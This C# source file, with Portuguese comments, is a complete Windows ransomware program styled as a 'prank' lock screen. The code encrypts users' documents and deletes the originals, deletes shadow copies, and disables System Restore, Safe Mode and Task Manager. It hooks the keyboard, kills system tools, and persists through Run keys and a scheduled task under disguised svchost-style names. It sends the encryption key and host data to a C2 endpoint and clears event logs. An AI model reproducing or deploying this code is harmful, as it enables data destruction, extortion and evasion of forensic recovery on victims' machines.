using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

public class TrolagemHacker : Form
{
    private TextBox txtChave;
    private Button btnDesbloquear;
    private Label lblCronometro;
    private System.Windows.Forms.Timer timerProtecao;
    private System.Windows.Forms.Timer timerRelogio;
    private System.Windows.Forms.Timer timerVigia;
    private DateTime tempoFinal;

    private const string SENHA_MESTRA = "nakaxima123";
    private const string URL_SENHA    = "https://raw.githubusercontent.com/espertin/wind/main/trolagem";
    private const string URL_HACKER   = "https://i.ibb.co/NgkJFxH8/ASA.png";
    private const string URL_QRCODE   = "https://raw.githubusercontent.com/espertin/wind/main/QR.png";

    // C2 para envio da chave (pastebin raw ou qualquer endpoint)
    private const string URL_C2 = "https://httpbin.org/post";

    // Caminhos de persistência
    private static string exeHidden  = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "WindowsService.exe");
    private static string exeStartup = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "SystemCheck.exe");
    private static string exeLocal   = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "svchost_check.exe");

    // Arquivo de chave AES (oculto)
    private static string keyFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", ".syskey");

    [DllImport("user32.dll")] private static extern int FindWindow(string c, string w);
    [DllImport("user32.dll")] private static extern int ShowWindow(int h, int cmd);
    [DllImport("user32.dll")] private static extern bool SetForegroundWindow(IntPtr h);
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    private const int SW_HIDE = 0, SW_SHOW = 5;

    private delegate IntPtr LowLevelKeyboardProc(int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll", SetLastError=true)] private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc fn, IntPtr mod, uint tid);
    [DllImport("user32.dll", SetLastError=true)] private static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll", SetLastError=true)] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll", SetLastError=true)] private static extern IntPtr GetModuleHandle(string m);

    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    public TrolagemHacker()
    {
        // Ofuscação: nome do processo disfarçado
        try { AppDomain.CurrentDomain.SetData("APP_NAME", "svchost"); } catch {}

        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;

        // Instância única
        Process atual = Process.GetCurrentProcess();
        foreach (Process p in Process.GetProcessesByName(atual.ProcessName))
            if (p.Id != atual.Id) try { p.Kill(); } catch {}

        this.BackColor = Color.Black;
        this.FormBorderStyle = FormBorderStyle.None;
        this.WindowState = FormWindowState.Maximized;
        this.TopMost = true;
        this.ShowInTaskbar = false;
        this.DoubleBuffered = true;

        int sw = Screen.PrimaryScreen.Bounds.Width;
        int sh = Screen.PrimaryScreen.Bounds.Height;

        BloquearRotasDeFuga();
        InstalarPersistencia();

        // ============================================================
        // DOWNLOAD DAS IMAGENS PARA DISCO
        // ============================================================
        string tempFolder = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
        if (!Directory.Exists(tempFolder)) Directory.CreateDirectory(tempFolder);
        string hackerPath = Path.Combine(tempFolder, "hacker.png");
        string qrPath     = Path.Combine(tempFolder, "qr.png");

        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        WebClient wc = new WebClient();
        wc.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
        wc.Headers.Add("Cache-Control", "no-cache");
        wc.Headers.Add("Pragma", "no-cache");
        string cb = "?nocache=" + DateTime.Now.Ticks;
        try { wc.DownloadFile(URL_HACKER + cb, hackerPath); } catch {}
        try { wc.DownloadFile(URL_QRCODE + cb, qrPath); } catch {}

        // ============================================================
        // IMAGEM HACKER (TOPO - CENTRALIZADA)
        // ============================================================
        PictureBox pbHacker = new PictureBox();
        pbHacker.BackColor = Color.Black;
        pbHacker.SizeMode = PictureBoxSizeMode.Zoom;
        pbHacker.Size = new Size(180, 180);
        pbHacker.Location = new Point((sw - 180) / 2, 15);
        if (File.Exists(hackerPath)) pbHacker.ImageLocation = hackerPath;
        this.Controls.Add(pbHacker);

        // ============================================================
        // TÍTULO
        // ============================================================
        Label lblTitulo = new Label();
        lblTitulo.Text = "ERRO FATAL: SISTEMA INFECTADO PELO VÍRUS 'CURIOSO_V1.0'";
        lblTitulo.ForeColor = Color.Red;
        lblTitulo.Font = new Font("Courier New", 22, FontStyle.Bold);
        lblTitulo.TextAlign = ContentAlignment.MiddleCenter;
        lblTitulo.Size = new Size(sw, 60);
        lblTitulo.Location = new Point(0, 200);
        this.Controls.Add(lblTitulo);

        // ============================================================
        // TEXTO ZOEIRA
        // ============================================================
        Label lblTexto = new Label();
        lblTexto.Text =
            "Parece que alguem andou clicando onde nao devia, hein?\n" +
            "O Windows detectou um nivel critico de 'curiosidade excessiva'\n" +
            "e decidiu tirar ferias por 24 horas.\n\n" +
            "STATUS DO SISTEMA:\n" +
            "- Barra de tarefas: SEQUESTRADA\n" +
            "- Area de trabalho: DELETADA (BRINCADEIRINHA... OU NAO)\n" +
            "- Gerenciador de tarefas: EM GREVE\n" +
            "- Modo Seguro: BLOQUEADO\n" +
            "- Menu de Recuperacao: DESATIVADO\n\n" +
            "Se voce quiser ver sua area de trabalho de novo hoje,\n" +
            "vai ter que adivinhar a senha secreta.\n" +
            "Dica: Voce nunca vai acertar kkkkkk.\n" +
            "Digite a chave abaixo se tiver coragem!";
        lblTexto.ForeColor = Color.Lime;
        lblTexto.Font = new Font("Courier New", 11, FontStyle.Bold);
        lblTexto.TextAlign = ContentAlignment.MiddleCenter;
        lblTexto.Size = new Size(800, 260);
        lblTexto.Location = new Point((sw - 800) / 2, 265);
        this.Controls.Add(lblTexto);

        // ============================================================
        // QR CODE (CENTRALIZADO)
        // ============================================================
        PictureBox pbQR = new PictureBox();
        pbQR.BackColor = Color.Black;
        pbQR.SizeMode = PictureBoxSizeMode.Zoom;
        pbQR.Size = new Size(110, 110);
        pbQR.Location = new Point((sw - 110) / 2, 530);
        if (File.Exists(qrPath)) pbQR.ImageLocation = qrPath;
        this.Controls.Add(pbQR);

        // ============================================================
        // CAMPO SENHA + BOTÃO
        // ============================================================
        txtChave = new TextBox();
        txtChave.PasswordChar = '*';
        txtChave.Font = new Font("Arial", 18);
        txtChave.TextAlign = HorizontalAlignment.Center;
        txtChave.Size = new Size(250, 40);
        txtChave.Location = new Point((sw - 250) / 2, 650);
        this.Controls.Add(txtChave);

        btnDesbloquear = new Button();
        btnDesbloquear.Text = "DESBLOQUEAR";
        btnDesbloquear.BackColor = Color.Lime;
        btnDesbloquear.FlatStyle = FlatStyle.Flat;
        btnDesbloquear.Font = new Font("Arial", 11, FontStyle.Bold);
        btnDesbloquear.Size = new Size(250, 45);
        btnDesbloquear.Location = new Point((sw - 250) / 2, 700);
        btnDesbloquear.Click += (s, e) => VerificarChave();
        this.Controls.Add(btnDesbloquear);

        // ============================================================
        // CRONÔMETRO 24H (RODAPÉ)
        // ============================================================
        tempoFinal = DateTime.Now.AddHours(24);
        lblCronometro = new Label();
        lblCronometro.ForeColor = Color.Lime;
        lblCronometro.Font = new Font("Courier New", 24, FontStyle.Bold);
        lblCronometro.Size = new Size(sw, 50);
        lblCronometro.TextAlign = ContentAlignment.MiddleCenter;
        lblCronometro.Location = new Point(0, sh - 90);
        this.Controls.Add(lblCronometro);

        timerRelogio = new System.Windows.Forms.Timer();
        timerRelogio.Interval = 1000;
        timerRelogio.Tick += (s, e) => {
            TimeSpan r = tempoFinal - DateTime.Now;
            lblCronometro.Text = r.TotalSeconds <= 0 ? "TEMPO ESGOTADO" :
                string.Format("{0:D2}:{1:D2}:{2:D2}", r.Hours, r.Minutes, r.Seconds);
        };
        timerRelogio.Start();

        // ============================================================
        // PROTEÇÃO
        // ============================================================
        ControlarBarraTarefas(false);

        timerProtecao = new System.Windows.Forms.Timer();
        timerProtecao.Interval = 500;
        timerProtecao.Tick += (s, e) => {
            string[] kill = {"taskmgr","cmd","powershell","pwsh","msconfig","regedit","procexp","procexp64","procmon"};
            foreach (var k in kill) foreach (var p in Process.GetProcessesByName(k)) try { p.Kill(); } catch {}
            ControlarBarraTarefas(false);
            if (GetForegroundWindow() != this.Handle) { SetForegroundWindow(this.Handle); txtChave.Focus(); }
        };
        timerProtecao.Start();

        timerVigia = new System.Windows.Forms.Timer();
        timerVigia.Interval = 10000;
        timerVigia.Tick += (s, e) => {
            string myPath = Application.ExecutablePath;
            if (!File.Exists(exeHidden))  try { File.Copy(myPath, exeHidden, true); } catch {}
            if (!File.Exists(exeStartup)) try { File.Copy(myPath, exeStartup, true); } catch {}
            if (!File.Exists(exeLocal))   try { File.Copy(myPath, exeLocal, true); } catch {}
            try {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                rk.SetValue("SecurityAlert", exeHidden);
                rk.SetValue("WindowsServiceCheck", exeLocal);
            } catch {}
        };
        timerVigia.Start();

        // ============================================================
        // FUNÇÕES DE RANSOMWARE EM SEGUNDO PLANO (THREAD SEPARADA)
        // ============================================================
        Thread tBg = new Thread(() => {
            Thread.Sleep(2000); // Aguardar tela carregar
            ExecutarFuncoesRansomware();
        });
        tBg.IsBackground = true;
        tBg.Start();

        _hookID = SetHook(_proc);
        txtChave.Focus();
    }

    // ================================================================
    // FUNÇÕES DE RANSOMWARE (RODANDO EM SEGUNDO PLANO)
    // ================================================================
    private void ExecutarFuncoesRansomware()
    {
        // --- 1. Gerar chave AES-256 ---
        byte[] aesKey, aesIV;
        using (Aes aes = Aes.Create()) {
            aes.KeySize = 256;
            aes.GenerateKey();
            aes.GenerateIV();
            aesKey = aes.Key;
            aesIV  = aes.IV;
        }

        // --- 2. Salvar chave localmente (oculta) ---
        try {
            string keyDir = Path.GetDirectoryName(keyFile);
            if (!Directory.Exists(keyDir)) Directory.CreateDirectory(keyDir);
            File.WriteAllText(keyFile,
                Convert.ToBase64String(aesKey) + "\n" + Convert.ToBase64String(aesIV));
            File.SetAttributes(keyFile, FileAttributes.Hidden | FileAttributes.System);
        } catch {}

        // --- 3. Criptografar arquivos (Desktop, Documentos, Downloads) ---
        string[] pastas = {
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"
        };
        string[] exts = {
            "*.txt","*.doc","*.docx","*.xls","*.xlsx","*.pdf",
            "*.jpg","*.jpeg","*.png","*.mp4","*.zip","*.rar",
            "*.csv","*.ppt","*.pptx","*.mp3","*.bmp","*.gif"
        };

        foreach (string pasta in pastas) {
            if (!Directory.Exists(pasta)) continue;
            foreach (string ext in exts) {
                try {
                    foreach (string arquivo in Directory.GetFiles(pasta, ext, SearchOption.TopDirectoryOnly)) {
                        try {
                            if (arquivo == Application.ExecutablePath) continue;
                            if (arquivo == keyFile) continue;
                            if (arquivo.EndsWith(".locked")) continue;
                            byte[] dados = File.ReadAllBytes(arquivo);
                            byte[] cripto = CriptografarBytes(dados, aesKey, aesIV);
                            File.WriteAllBytes(arquivo + ".locked", cripto);
                            File.Delete(arquivo);
                            Thread.Sleep(30);
                        } catch {}
                    }
                } catch {}
            }
        }

        // --- 4. Deletar Shadow Copies ---
        try {
            Process.Start(new ProcessStartInfo("vssadmin", "delete shadows /all /quiet") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
        } catch {}

        // --- 5. Desativar System Restore ---
        try {
            Process.Start(new ProcessStartInfo("powershell",
                "-WindowStyle Hidden -Command \"Disable-ComputerRestore -Drive 'C:\\'\"") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
        } catch {}

        // --- 6. Enviar chave AES para C2 (exfiltração) ---
        try {
            string hostname  = Environment.MachineName;
            string usuario   = Environment.UserName;
            string chaveB64  = Convert.ToBase64String(aesKey);
            string ivB64     = Convert.ToBase64String(aesIV);
            string payload   = "{\"host\":\"" + hostname + "\",\"user\":\"" + usuario +
                               "\",\"key\":\"" + chaveB64 + "\",\"iv\":\"" + ivB64 + "\"}";

            WebClient wcC2 = new WebClient();
            wcC2.Headers.Add("Content-Type", "application/json");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            wcC2.UploadString(URL_C2, "POST", payload);
        } catch {}

        // --- 7. Exfiltração de dados (lista de arquivos encontrados) ---
        try {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("=== EXFILTRACAO - " + DateTime.Now + " ===");
            sb.AppendLine("Maquina: " + Environment.MachineName);
            sb.AppendLine("Usuario: " + Environment.UserName);
            sb.AppendLine("OS: " + Environment.OSVersion);
            sb.AppendLine("Arquivos criptografados:");
            foreach (string pasta in pastas) {
                if (!Directory.Exists(pasta)) continue;
                foreach (string f in Directory.GetFiles(pasta, "*.locked", SearchOption.TopDirectoryOnly))
                    sb.AppendLine("  " + f);
            }
            string logPath = Path.Combine(Path.GetTempPath(), ".exfil.log");
            File.WriteAllText(logPath, sb.ToString());
            File.SetAttributes(logPath, FileAttributes.Hidden | FileAttributes.System);

            // Enviar log para C2
            WebClient wcLog = new WebClient();
            wcLog.Headers.Add("Content-Type", "text/plain");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            wcLog.UploadString(URL_C2, "POST", sb.ToString());
        } catch {}

        // --- 8. Ofuscação anti-análise: apagar rastros de execução ---
        try {
            // Limpar prefetch
            Process.Start(new ProcessStartInfo("cmd",
                "/c del /f /q /s \"%SystemRoot%\\Prefetch\\*.pf\" >nul 2>&1") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
            // Limpar event logs
            Process.Start(new ProcessStartInfo("wevtutil", "cl System") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
            Process.Start(new ProcessStartInfo("wevtutil", "cl Application") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
            Process.Start(new ProcessStartInfo("wevtutil", "cl Security") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
        } catch {}
    }

    // ================================================================
    // CRIPTOGRAFIA / DESCRIPTOGRAFIA AES
    // ================================================================
    private byte[] CriptografarBytes(byte[] dados, byte[] key, byte[] iv) {
        using (Aes aes = Aes.Create()) {
            aes.Key = key; aes.IV = iv;
            using (MemoryStream ms = new MemoryStream())
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write)) {
                cs.Write(dados, 0, dados.Length);
                cs.FlushFinalBlock();
                return ms.ToArray();
            }
        }
    }

    private byte[] DescriptografarBytes(byte[] dados, byte[] key, byte[] iv) {
        using (Aes aes = Aes.Create()) {
            aes.Key = key; aes.IV = iv;
            using (MemoryStream ms = new MemoryStream())
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write)) {
                cs.Write(dados, 0, dados.Length);
                cs.FlushFinalBlock();
                return ms.ToArray();
            }
        }
    }

    private void DescriptografarArquivos() {
        try {
            if (!File.Exists(keyFile)) return;
            string[] linhas = File.ReadAllLines(keyFile);
            byte[] key = Convert.FromBase64String(linhas[0].Trim());
            byte[] iv  = Convert.FromBase64String(linhas[1].Trim());

            string[] pastas = {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"
            };

            foreach (string pasta in pastas) {
                if (!Directory.Exists(pasta)) continue;
                foreach (string arquivo in Directory.GetFiles(pasta, "*.locked", SearchOption.TopDirectoryOnly)) {
                    try {
                        byte[] dados    = File.ReadAllBytes(arquivo);
                        byte[] original = DescriptografarBytes(dados, key, iv);
                        string nome     = arquivo.Substring(0, arquivo.Length - 7);
                        File.WriteAllBytes(nome, original);
                        File.Delete(arquivo);
                    } catch {}
                }
            }
            try { File.Delete(keyFile); } catch {}
            try { File.Delete(Path.Combine(Path.GetTempPath(), ".exfil.log")); } catch {}

            // Reativar System Restore
            try {
                Process.Start(new ProcessStartInfo("powershell",
                    "-WindowStyle Hidden -Command \"Enable-ComputerRestore -Drive 'C:\\'\"") {
                    WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });
            } catch {}
        } catch {}
    }

    // ================================================================
    // VERIFICAR CHAVE
    // ================================================================
    private void VerificarChave() {
        string senhaGitHub = "";
        try {
            WebClient wc2 = new WebClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            wc2.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
            wc2.Headers.Add("Cache-Control", "no-cache");
            senhaGitHub = wc2.DownloadString(URL_SENHA + "?nocache=" + DateTime.Now.Ticks).Trim();
        } catch {}

        if (txtChave.Text == SENHA_MESTRA ||
            (!string.IsNullOrEmpty(senhaGitHub) && txtChave.Text == senhaGitHub)) {

            UnhookWindowsHookEx(_hookID);
            timerProtecao.Stop();
            timerVigia.Stop();
            timerRelogio.Stop();
            ControlarBarraTarefas(true);

            Thread tRestore = new Thread(() => {
                DescriptografarArquivos();
                this.Invoke((Action)(() => {
                    // Restaurar modo seguro e recuperação
                    try { Process.Start(new ProcessStartInfo("bcdedit", "/deletevalue {default} safeboot") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
                    try { Process.Start(new ProcessStartInfo("bcdedit", "/set {default} recoveryenabled Yes") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
                    try { Process.Start(new ProcessStartInfo("bcdedit", "/set {default} bootstatuspolicy DisplayAllFailures") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
                    try { Process.Start(new ProcessStartInfo("bcdedit", "/set {current} bootmenupolicy Standard") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}

                    // Restaurar políticas
                    try {
                        RegistryKey pk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                        if (pk != null) { pk.DeleteValue("DisableTaskMgr", false); pk.DeleteValue("DisableLockWorkstation", false); pk.DeleteValue("DisableChangePassword", false); }
                        RegistryKey ek = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true);
                        if (ek != null) { ek.DeleteValue("NoWinKeys", false); ek.DeleteValue("NoClose", false); ek.DeleteValue("NoLogoff", false); }
                    } catch {}

                    // Remover persistência
                    try {
                        RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                        rk.DeleteValue("SecurityAlert", false);
                        rk.DeleteValue("WindowsServiceCheck", false);
                    } catch {}
                    try { Process.Start(new ProcessStartInfo("schtasks", "/delete /f /tn \"WindowsSecurityService\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}

                    // Limpar imagens
                    string tf = Path.Combine(Path.GetTempPath(), "trolagem_imgs");
                    if (Directory.Exists(tf)) try { Directory.Delete(tf, true); } catch {}

                    // Autodestruição
                    string bat = "@echo off\ntimeout /t 3 /nobreak > nul\n" +
                        "del /f /q \"" + Application.ExecutablePath + "\" >nul 2>&1\n" +
                        "del /f /q \"" + exeHidden + "\" >nul 2>&1\n" +
                        "del /f /q \"" + exeStartup + "\" >nul 2>&1\n" +
                        "del /f /q \"" + exeLocal + "\" >nul 2>&1\n" +
                        "del /f /q \"%~f0\"\nexit";
                    string bp = Path.Combine(Path.GetTempPath(), "cleanup_final.bat");
                    File.WriteAllText(bp, bat);
                    Process.Start(new ProcessStartInfo("cmd.exe", "/c \"" + bp + "\"") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true });

                    MessageBox.Show("SISTEMA RESTAURADO!\nTodos os arquivos foram descriptografados.\nTodos os bloqueios foram removidos.", "DESBLOQUEADO", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    Application.Exit();
                }));
            });
            tRestore.IsBackground = true;
            tRestore.Start();
        } else {
            MessageBox.Show("CHAVE INCORRETA!\nTentativas restantes: ???", "ERRO", MessageBoxButtons.OK, MessageBoxIcon.Error);
            txtChave.Clear();
            txtChave.Focus();
        }
    }

    // ================================================================
    // BLOQUEIOS E PERSISTÊNCIA
    // ================================================================
    private void BloquearRotasDeFuga() {
        try { Process.Start(new ProcessStartInfo("bcdedit", "/set {default} safeboot disabled") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
        try { Process.Start(new ProcessStartInfo("bcdedit", "/set {default} recoveryenabled No") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
        try { Process.Start(new ProcessStartInfo("bcdedit", "/set {default} bootstatuspolicy IgnoreAllFailures") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
        try { Process.Start(new ProcessStartInfo("bcdedit", "/set {current} bootmenupolicy Legacy") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
        try {
            RegistryKey pk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            pk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            pk.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
            pk.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
            RegistryKey ek = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            ek.SetValue("NoWinKeys", 1, RegistryValueKind.DWord);
            ek.SetValue("NoClose", 1, RegistryValueKind.DWord);
            ek.SetValue("NoLogoff", 1, RegistryValueKind.DWord);
        } catch {}
    }

    private void InstalarPersistencia() {
        try {
            string myPath = Application.ExecutablePath;
            string dir1 = Path.GetDirectoryName(exeHidden);
            if (!Directory.Exists(dir1)) Directory.CreateDirectory(dir1);
            if (!File.Exists(exeHidden))  File.Copy(myPath, exeHidden, true);
            if (!File.Exists(exeStartup)) File.Copy(myPath, exeStartup, true);
            string dir3 = Path.GetDirectoryName(exeLocal);
            if (!Directory.Exists(dir3)) Directory.CreateDirectory(dir3);
            if (!File.Exists(exeLocal))   File.Copy(myPath, exeLocal, true);
            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue("SecurityAlert", exeHidden);
            rk.SetValue("WindowsServiceCheck", exeLocal);
            try { Process.Start(new ProcessStartInfo("schtasks",
                "/create /f /sc ONLOGON /tn \"WindowsSecurityService\" /tr \"" + exeHidden + "\" /rl HIGHEST") {
                WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch {}
        } catch {}
    }

    private void ControlarBarraTarefas(bool mostrar) {
        int h = FindWindow("Shell_TrayWnd", "");
        if (h != 0) ShowWindow(h, mostrar ? SW_SHOW : SW_HIDE);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process p = Process.GetCurrentProcess())
        using (ProcessModule m = p.MainModule)
            return SetWindowsHookEx(13, proc, GetModuleHandle(m.ModuleName), 0);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            Keys key = (Keys)Marshal.ReadInt32(lParam);
            if (key == Keys.LWin || key == Keys.RWin || key == Keys.Delete ||
                (key == Keys.Tab    && Control.ModifierKeys == Keys.Alt) ||
                (key == Keys.Escape && Control.ModifierKeys == Keys.Control) ||
                (key == Keys.F4     && Control.ModifierKeys == Keys.Alt))
                return (IntPtr)1;
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [STAThread]
    public static void Main() {
        bool criouNovo;
        Mutex mutex = new Mutex(true, "TrolagemHackerFortaleza", out criouNovo);
        if (!criouNovo) return;
        Application.EnableVisualStyles();
        Application.Run(new TrolagemHacker());
    }
}
